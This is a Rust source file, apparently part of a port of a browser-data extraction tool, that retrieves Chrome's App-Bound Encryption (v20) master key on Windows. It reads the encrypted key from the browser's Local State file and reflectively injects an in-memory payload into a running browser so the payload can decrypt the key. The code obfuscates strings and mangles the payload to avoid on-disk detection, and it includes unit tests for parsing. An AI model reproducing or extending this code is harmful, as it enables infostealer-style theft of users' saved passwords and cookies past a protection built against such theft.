//! Windows ABE v20 (App-Bound Encryption) master-key retriever — the
//! orchestrator half of Phase 5 (Go: `masterkey/abe/retriever_windows.go`).
//!
//! Chrome 127+ stores the master key in `Local State` under
//! `os_crypt.app_bound_encrypted_key` as base64(`"APPB"` + AES-GCM
//! ciphertext) protected by the machine app-bound key. The app-bound key is
//! only reachable inside the browser process (elevation_service COM), so this
//! tier does not decrypt anything itself: it hands the ciphertext to the
//! reflective injector, which runs `PAYLOAD_AMD64` in a real browser instance
//! and reads the 32-byte key back (all `unsafe` lives in `abi`).
//!
//! Per-tier contract (Go `(nil, nil)`): a missing `windows_abe_key`, an
//! absent Local State, or a non-`APPB` value are all *not applicable* →
//! `Ok(None)`; the v10 tier (or no tier) carries the profile.

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use serde::Deserialize;

use crate::retriever::{Hints, Retriever, RetrieverError};

/// The prefix Chrome prepends to the app-bound blob inside
/// `app_bound_encrypted_key` (winnt: `"APPB"`).
const APPB_PREFIX: &[u8] = b"APPB";

/// Env var carrying the base64 APPB ciphertext to the injected payload
/// (mirrors Go's `HBD_ABE_ENC_B64` — the payload calls
/// `IElevator::DecryptData` on it and publishes the key). Materialized at
/// runtime via `bypass::x!` so the name never lands plaintext in the image.
const ABE_ENC_ENV_KEY: u8 = 0x77;

/// Mirrors the `Local State` slice Chromium's v20 retriever reads.
#[derive(Debug, Deserialize, Default)]
struct LocalState {
    #[serde(default)]
    os_crypt: OsCrypt,
}

#[derive(Debug, Deserialize, Default)]
struct OsCrypt {
    #[serde(default)]
    app_bound_encrypted_key: String,
}

/// Retrieves the Chromium v20 master key via reflective injection into a real
/// browser process. Returns `Ok(None)` when the tier is not applicable.
#[cfg(windows)]
#[derive(Debug, Default, Clone, Copy)]
pub struct AbeRetriever;

#[cfg(windows)]
impl Retriever for AbeRetriever {
    fn retrieve_key(&self, hints: &Hints) -> Result<Option<Vec<u8>>, RetrieverError> {
        if hints.windows_abe_key.is_empty() {
            return Ok(None);
        }
        if hints.local_state_path.as_os_str().is_empty() || !hints.local_state_path.is_file() {
            return Ok(None);
        }
        let blob =
            read_app_bound_blob(&hints.local_state_path).map_err(RetrieverError::Retriever)?;
        let Some(blob) = blob else {
            return Ok(None);
        };

        // 4-tier executable resolution: registry App Paths HKLM → HKCU →
        // running-process probe → expanded install fallbacks (Go: same).
        let exe_path = abi::executable_path(&hints.windows_abe_key).map_err(|e| {
            RetrieverError::Retriever(format!("resolve {}: {e}", hints.windows_abe_key))
        })?;

        let enc_b64 = STANDARD.encode(&blob);
        let env_key = bypass::x!("HBD_ABE_ENC_B64", ABE_ENC_ENV_KEY);
        let env: Vec<(&str, &[u8])> = vec![(&env_key, enc_b64.as_bytes())];
        // Materialized from the const-mangled blob (`bypass::entropy`) so the
        // on-disk image carries no raw PE hash; the real payload exists only
        // in memory here, just before injection.
        let payload = bypass::entropy::materialize();
        let key = abi::inject(&exe_path, &payload, &env).map_err(|e| {
            RetrieverError::Retriever(format!("inject {}: {e}", hints.windows_abe_key))
        })?;
        Ok(Some(key.to_vec()))
    }
}

/// Reads + decodes `os_crypt.app_bound_encrypted_key`, returning `Ok(None)`
/// for an absent value (tier not applicable). The `APPB` prefix is stripped —
/// the elevation service's `DecryptData` expects the bare ciphertext (Go:
/// `abeBlob` returns `decoded[len("APPB"):]`); a non-`APPB` value or an
/// undersized blob is a hard error, mirroring Go. Kept free of the Windows
/// gate so its logic is unit-testable on any host.
fn read_app_bound_blob(path: &std::path::Path) -> Result<Option<Vec<u8>>, String> {
    let bytes = std::fs::read(path).map_err(|e| format!("read local state: {e}"))?;
    let state: LocalState =
        serde_json::from_slice(&bytes).map_err(|e| format!("parse local state: {e}"))?;
    let encrypted = state.os_crypt.app_bound_encrypted_key;
    if encrypted.is_empty() {
        return Ok(None);
    }
    let blob = STANDARD
        .decode(encrypted.trim())
        .map_err(|e| format!("decode app_bound_encrypted_key: {e}"))?;
    if blob.len() <= APPB_PREFIX.len() {
        return Err(format!(
            "app_bound_encrypted_key too short: {} bytes",
            blob.len()
        ));
    }
    if !blob.starts_with(APPB_PREFIX) {
        // v10 "DPAPI"-prefixed blob or unknown format — this tier cannot lift it.
        return Err(format!(
            "app_bound_encrypted_key: unexpected prefix: got {:?}, want {:?}",
            &blob[..APPB_PREFIX.len()],
            APPB_PREFIX
        ));
    }
    Ok(Some(blob[APPB_PREFIX.len()..].to_vec()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_browser_key_is_not_applicable() {
        let r = AbeRetriever;
        let hints = Hints::default();
        assert_eq!(Ok(None), r.retrieve_key(&hints));
    }

    #[test]
    fn missing_local_state_is_not_applicable() {
        let r = AbeRetriever;
        let hints = Hints {
            windows_abe_key: "chrome".into(),
            local_state_path: std::path::PathBuf::from("C:\\nonexistent\\Local State"),
            ..Default::default()
        };
        assert_eq!(Ok(None), r.retrieve_key(&hints));
    }

    #[test]
    fn missing_app_bound_field_is_not_applicable() {
        let dir = temp_dir("nofield");
        let p = dir.join("Local State");
        std::fs::write(&p, r#"{"os_crypt": {"encrypted_key": "x"}}"#).unwrap();
        assert_eq!(Ok(None), read_app_bound_blob(&p));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn dpapi_prefixed_key_is_a_hard_error() {
        let dir = temp_dir("dpapi");
        let p = dir.join("Local State");
        // v10 keys carry a "DPAPI" prefix — the v20 tier cannot lift them
        // (Go: "unexpected prefix" error).
        std::fs::write(
            &p,
            r#"{"os_crypt": {"app_bound_encrypted_key": "RFBBUEkAAAAA"}}"#,
        )
        .unwrap();
        assert!(read_app_bound_blob(&p).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn corrupt_local_state_is_an_error() {
        let dir = temp_dir("corrupt");
        let p = dir.join("Local State");
        std::fs::write(&p, b"not json").unwrap();
        assert!(read_app_bound_blob(&p).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn invalid_base64_is_an_error() {
        let dir = temp_dir("badb64");
        let p = dir.join("Local State");
        std::fs::write(
            &p,
            r#"{"os_crypt": {"app_bound_encrypted_key": "!!!not-base64!!!"}}"#,
        )
        .unwrap();
        assert!(read_app_bound_blob(&p).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn appb_blob_survives_round_trip() {
        let dir = temp_dir("appb");
        let p = dir.join("Local State");
        let blob: Vec<u8> = b"APPB\x00\x01\x02\x03\x04".to_vec();
        std::fs::write(
            &p,
            format!(
                r#"{{"os_crypt": {{"app_bound_encrypted_key": "{}"}}}}"#,
                STANDARD.encode(&blob)
            ),
        )
        .unwrap();
        // APPB prefix is stripped — DecryptData expects the bare ciphertext
        // (Go: `decoded[len("APPB"):]`).
        assert_eq!(
            Ok(Some(vec![0x00, 0x01, 0x02, 0x03, 0x04])),
            read_app_bound_blob(&p)
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn temp_dir(tag: &str) -> std::path::PathBuf {
        let dir =
            std::env::temp_dir().join(format!("hbd-keyring-abe-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }
}
